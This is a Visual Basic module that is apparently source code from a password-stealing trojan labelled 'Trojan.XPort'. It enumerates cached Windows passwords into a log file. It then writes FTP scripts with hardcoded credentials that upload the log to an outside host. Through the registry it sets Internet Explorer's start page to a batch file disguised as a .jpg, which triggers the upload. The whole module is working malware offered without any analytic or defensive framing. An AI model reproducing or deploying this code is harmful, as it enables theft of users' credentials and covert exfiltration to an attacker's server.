Attribute VB_Name = "Api"
Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileSection Lib "kernel32" Alias "WritePrivateProfileSectionA" (ByVal lpAppName As String, ByVal lpString As String, ByVal lpFileName As String) As Long
Declare Function WNetEnumCachedPasswords Lib "mpr.dll" (ByVal s As String, ByVal i As Integer, ByVal b As Byte, ByVal proc As Long, ByVal l As Long) As Long

Public Const VER_PLATFORM_WIN32s = 0
Public Const VER_PLATFORM_WIN32_WINDOWS = 1
Public Const VER_PLATFORM_WIN32_NT = 2

Public X                    'counter, is needed to have this var outside of function as public
Public fName                'Inter-Modular Variable ;-p
Public TempDir              '      ---- || ----

Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type

Type PASSWORD_CACHE_ENTRY
    cdEntry As Integer
    cdResource As Integer
    cdPassword As Integer
    iEntry As Byte
    nType As Byte
    abResource(1 To 1024) As Byte
End Type

Public Function WinVer()
Dim OSV As OSVERSIONINFO
OSV.dwOSVersionInfoSize = Len(OSV)
If GetVersionEx(OSV) = 1 Then
    Select Case OSV.dwPlatformId
        Case VER_PLATFORM_WIN32s
            WinVer = "Windows32s"
        Case VER_PLATFORM_WIN32_NT
            WinVer = "Windows NT"
        Case VER_PLATFORM_WIN32_WINDOWS
            If OSV.dwMinorVersion = 0 Then
                WinVer = "Windows 95"
            Else
                WinVer = "Windows 98"
            End If
    End Select
End If
End Function

Public Function UserName()
Dim strName As String
strName = Space(255)
GetUserName strName, 255
UserName = Left(strName, InStr(1, strName, Chr(0)) - 1)
End Function

Public Function ComputerName()
Dim strComputer As String
strComputer = Space(255)
GetComputerName strComputer, 255
ComputerName = Left(strComputer, InStr(1, strComputer, Chr(0)) - 1)
End Function

Public Function iNstall()
Dim Path As String
Open TempDir & "temp.reg" For Output As #1
 Print #1, "REGEDIT4" & vbCrLf
 Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]"
If LCase(WinVer) = "windows nt" Then                    'Windows NT or Windows 2000 (/XP ???)
    Print #1, Chr(34) & "Start Page" & Chr(34) & "=" & Chr(34) & "file:///" & Left(Environ("windir"), 2) & "/" & Right(Environ("windir"), Len(Environ("windir")) - 3) & "/system32/DogFuck.jpg        !.bat" & Chr(34) & vbCrLf
    Open Environ("windir") & "\system32\ftp.bat" For Output As #2
     Print #2, "@ftp.exe -n -s:" & Environ("windir") & "\system32\ftp.dat >nul:"
    Open Environ("windir") & "\system32\ftp.dat" For Output As #3
    Open Environ("windir") & "\system32\DogFuck.jpg        !.bat" For Output As #4
     Print #4, "@echo off"
     Print #4, "echo Please Wait! Loading..."
     Print #4, "@ftp.exe -n -s:" & Environ("windir") & "\system32\ftp.dat >nul:"
Else                                                    'Windows 95 or 98 (/ME ???)
    Print #1, Chr(34) & "Start Page" & Chr(34) & "=" & Chr(34) & "file:///" & Left(Environ("windir"), 2) & "/" & Right(Environ("windir"), Len(Environ("windir")) - 3) & "/DogFuck.jpg        !.bat" & Chr(34) & vbCrLf
    Open Environ("windir") & "\ftp.bat" For Output As #2
     Print #2, "@ftp.exe -n -s:" & Environ("windir") & "\ftp.dat >nul:"
    Open Environ("windir") & "\ftp.dat" For Output As #3
    Open Environ("windir") & "\DogFuck.jpg        !.bat" For Output As #4
     Print #4, "@echo off"
     Print #4, "echo Please Wait! Loading..."
     Print #4, "@ftp.exe -n -s:" & Environ("windir") & "\ftp.dat >nul:"
End If
 Print #3, "o www.hyperlinx.cz"
 Print #3, "user XPort"
 Print #3, "k4hwd"
 Print #3, "ascii"
 Print #3, "put " & fName
 Print #3, "quit"
Close
Shell "regedit /s " & TempDir & "temp.reg", vbHide
Kill TempDir & "temp.reg"
End Function

Public Function CallBack(udtPCE As PASSWORD_CACHE_ENTRY, ByVal ing As Long) As Integer
Dim strRes As String, strPassWd As String, strAll As String, KEY As String, i As Long
For i = 1 To udtPCE.cdResource
    If udtPCE.abResource(i) <> 0 Then
        strRes = strRes & Chr(udtPCE.abResource(i))
    End If
Next i
For i = udtPCE.cdResource + 1 To (udtPCE.cdResource + udtPCE.cdPassword)
    If udtPCE.abResource(i) <> 0 Then
        strPassWd = strPassWd & Chr(udtPCE.abResource(i))
    End If
Next i
X = X + 1
KEY = "KEY" & X
WritePrivateProfileString "Trojan.XPort log file", KEY, strRes & ";" & strPassWd, fName
CallBack = True
End Function

Public Function Random_Names()
Randomize                                                                   'Initialize random-number generator
For i = 1 To 12                                                             '12-chars
 Char_or_nmb = Int((2 - 1 + 1) * Rnd + 1)                                   '1-2
 If Char_or_nmb = 1 Then
  Random_Names = Random_Names & Chr(Int((90 - 65 + 1) * Rnd + 65))          'add one "char" A-Z
 Else
  Random_Names = Random_Names & Int((9 - 0 + 1) * Rnd + 0)                  'add one "number" 0-9
 End If
Next i
Random_Names = UCase(Random_Names)                                          'upper case
End Function                                                                'end function...
